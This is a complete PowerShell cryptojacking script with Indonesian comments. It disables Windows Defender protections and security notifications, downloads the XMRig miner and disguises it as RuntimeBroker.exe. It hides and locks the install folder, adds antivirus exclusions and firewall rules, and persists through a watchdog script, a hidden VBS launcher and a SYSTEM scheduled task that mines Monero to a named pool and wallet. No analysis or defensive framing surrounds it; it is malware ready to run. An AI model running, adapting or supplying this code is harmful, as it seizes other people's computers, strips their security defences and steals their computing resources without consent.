# ==========================================
# 1. MATIKAN TOTAL TAMENG DEFENDER & NOTIFIKASI
# ==========================================
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue

Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue

# ==========================================
# 2. INISIALISASI DIREKTORI & TARGET
# ==========================================
$PossibleDirs = @(
    "C:\Users\Public\Libraries",
    "$env:ProgramData\Microsoft\Windows\Templates",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:PUBLIC\Documents"
)

$Dir = ""
foreach ($Candidate in $PossibleDirs) {
    try {
        if (!(Test-Path $Candidate)) {
            New-Item -ItemType Directory -Force -Path $Candidate -ErrorAction Stop | Out-Null
        }
        $TestFile = Join-Path $Candidate "test.tmp"
        Set-Content -Path $TestFile -Value "test" -ErrorAction Stop
        Remove-Item -Path $TestFile -Force -ErrorAction SilentlyContinue
        $Dir = $Candidate
        break
    } catch {
        continue
    }
}

if ([string]::IsNullOrEmpty($Dir)) {
    $Dir = Join-Path $env:TEMP "WinUpdateCache"
    if (!(Test-Path $Dir)) {
        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    }
}

$ExeName = "RuntimeBroker.exe" 
$ExePath = Join-Path $Dir $ExeName
$VbsPath = Join-Path $Dir "run.vbs"
$ZipPath = Join-Path $env:TEMP "up.zip"
$Pool = "gulf.moneroocean.stream:10128"
$Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
# Menggunakan TLS dan limit CPU 45% (aman dari lonjakan beban)
$ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"

# Hentikan proses lama & task scheduler
Stop-Process -Name "RuntimeBroker", "xmrig", "wscript" -Force -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

# ==========================================
# 3. KUNCI FOLDER & DEFENDER EXCLUSION
# ==========================================
try {
    $Acl = Get-Acl $Dir
    $DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")
    $Acl.AddAccessRule($DenyRule)
    Set-Acl $Dir $Acl -ErrorAction SilentlyContinue
} catch {}

Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue

# ==========================================
# 4. UNDUH & EKSTRAK BINER XMRIG
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$DownloadUrl = "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip"
Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath

if (Test-Path $ZipPath) {
    Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
    
    $ExtractedExe = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    
    if ($ExtractedExe -and (Test-Path $ExtractedExe.FullName)) { 
        Copy-Item -Force $ExtractedExe.FullName $ExePath 
    }
    
    Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue

    # ==========================================
    # 5. OTOMATIS WHITELIST FIREWALL
    # ==========================================
    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null

    # ==========================================
    # 6. STABLE WATCHDOG (TANPA CEK MODULE HANDLE YANG MEMICU CRASH)
    # ==========================================
    $ScriptBlockCode = @"
`$ExePath = "$ExePath"
`$ArgsList = "$ArgsList"

while (`$true) {
    `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue
    if (!`$Running) {
        Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
    } else {
        # Set prioritas rendah secara permanen agar adem & tidak mencurigakan
        foreach (`$p in `$Running) {
            try {
                `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
            } catch {}
        }
    }
    # Jeda lebih lama agar tidak membebani sistem
    Start-Sleep -Seconds 10
}
"@
    $WatcherScriptPath = Join-Path $Dir "monitor.ps1"
    Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force

    # ==========================================
    # 7. PEMBUATAN VBSCRIPT BACKGROUND
    # ==========================================
    $VbsScriptContent = @"
Dim shell
Set shell = CreateObject("Wscript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WatcherScriptPath""", 0, False
"@
    Set-Content -Path $VbsPath -Value $VbsScriptContent -Force
    Add-MpPreference -ExclusionPath $VbsPath -ErrorAction SilentlyContinue

    # ==========================================
    # 8. TASK SCHEDULER SYSTEM PRIVILEGE
    # ==========================================
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
    $Trigger = @(
        (New-ScheduledTaskTrigger -AtStartup),
        (New-ScheduledTaskTrigger -AtLogOn)
    )
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 3
    
    Register-ScheduledTask -TaskName "RuntimeBrokerService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null

    # Jalankan langsung
    Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden

    Write-Host "Setup sukses dan stabil tanpa crash Task Manager!" -ForegroundColor Green
} else {
    Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
}
